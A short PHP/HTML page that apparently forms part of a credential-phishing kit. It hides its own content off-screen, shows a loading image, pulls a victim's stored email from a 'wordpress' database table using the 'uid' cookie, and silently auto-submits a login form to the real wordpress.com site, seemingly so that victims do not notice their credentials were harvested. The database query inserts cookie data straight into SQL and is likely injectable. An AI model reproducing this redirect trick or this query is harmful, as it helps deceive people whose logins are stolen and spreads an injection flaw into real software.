<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `wordpress` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["word"].submit();}</script>



<form action="https://en.wordpress.com/wp-login.php" method="post" novalidate="novalidate" id="word">
						<input type="email" name="log" placeholder="Email or Username" autocorrect="off" autocapitalize="off" spellcheck="false" value="<?=$email;?>">
						<input type="password" name="pwd" placeholder="Password">
						<input type="checkbox" name="rememberme" value="forever" id="signin-rememberme" checked="true"><label for="signin-rememberme">Remember me</label>
						<input type="submit" value="Sign in">
						<a class="password-help" href="http://en.wordpress.com/wp-login.php?action=lostpassword">Help</a>

						<input type="hidden" name="testcookie" value="1">
						<input type="hidden" name="redirect_to" value="//wordpress.com/">
					</form>
                    
                    
                    

</body>
</html>

